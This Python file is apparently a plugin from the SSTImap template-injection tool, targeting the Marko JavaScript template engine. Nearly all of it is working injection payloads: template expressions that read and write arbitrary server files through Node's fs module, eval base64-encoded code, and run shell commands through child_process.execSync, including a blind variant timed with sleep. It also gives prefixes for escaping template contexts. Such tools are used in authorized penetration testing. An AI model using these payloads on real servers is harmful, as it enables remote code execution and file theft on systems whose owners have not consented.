from plugins.languages import javascript
from utils import rand


class Marko(javascript.Javascript):
    generic_plugin = True
    priority = 5
    plugin_info = {
        "Description": """Marko template engine""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://markojs.com/",
            "Github: https://github.com/marko-js/marko",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '${{{header[0]}+{header[1]}}}',
                'trailer': '${{{trailer[0]}+{trailer[1]}}}',
                'test_render': f'${{typeof({rand.randints[0]})+{rand.randints[1]}}}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """${{''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}""",
            },
            'write': {
                'call': 'inject',
                'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64p}','base64'),'binary')}}""",
                'truncate': """${{require('fs').writeFileSync('{path}','')}}"""
            },
            'read': {
                'call': 'render',
                'read': """${{require('fs').readFileSync('{path}').toString('base64')}}"""
            },
            'read_error': {
                'read': """require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': "${{require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')}}"
            },
            'md5_error': {
                'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
            },
            'evaluate': {
                'evaluate': """${{eval(Buffer('{code_b64p}', 'base64').toString())}}"""
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute': {
                'execute': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())}}"""
            },
            'execute_error': {
                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '${"1"', 'closures': javascript.ctx_closures},
            # If escapes require to know the ending tag e.g. <div if(%s)></div>
            # This to escape from <var name=data/> and <assign name=data/>
            {'level': 2, 'prefix': '1/>', 'suffix': ''},
        ])
